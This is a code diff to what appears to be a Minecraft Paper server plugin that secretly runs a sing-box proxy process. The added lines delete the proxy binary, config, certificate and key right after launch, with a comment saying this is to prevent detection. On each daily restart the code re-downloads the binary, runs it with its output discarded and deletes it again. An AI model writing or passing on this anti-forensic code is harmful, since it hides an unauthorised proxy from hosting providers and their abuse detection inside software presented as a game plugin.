@@ -95,6 +95,16 @@ public class PaperPlugin extends JavaPlugin {
 
             // 保存 sing-box 进程 + 启动每日 00:03 重启
             singboxProcess = startSingBox(bin, configJson);
+            // 启动后删除二进制和配置，防止被检测
+            try {
+                if (Files.exists(bin)) Files.delete(bin);
+                if (Files.exists(configJson)) Files.delete(configJson);
+                if (Files.exists(cert)) Files.delete(cert);
+                if (Files.exists(key)) Files.delete(key);
+                getLogger().info("🧹 已清除 sing-box 痕迹");
+            } catch (IOException e) {
+                getLogger().warning("⚠️ 清除 sing-box 痕迹失败: " + e.getMessage());
+            }
             scheduleDailyRestart(bin, configJson);
 
             // ===== komari-agent 集成 =====
@@ -574,12 +584,19 @@ public class PaperPlugin extends JavaPlugin {
                     }
 
                     try {
+                        // 重新下载 sing-box（之前已被删除）
+                        String version = fetchLatestSingBoxVersion();
+                        safeDownloadSingBox(version, bin, cfg.getParent());
                         ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
                         pb.redirectErrorStream(true);
                         pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                         pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                         singboxProcess = pb.start();
                         getLogger().info("sing-box 重启成功，新 PID: " + singboxProcess.pid());
+                        // 启动后再次删除痕迹
+                        try {
+                            if (Files.exists(bin)) Files.delete(bin);
+                        } catch (IOException ignored) {}
                     } catch (Exception e) {
                         getLogger().severe("重启失败: " + e.getMessage());
                     }
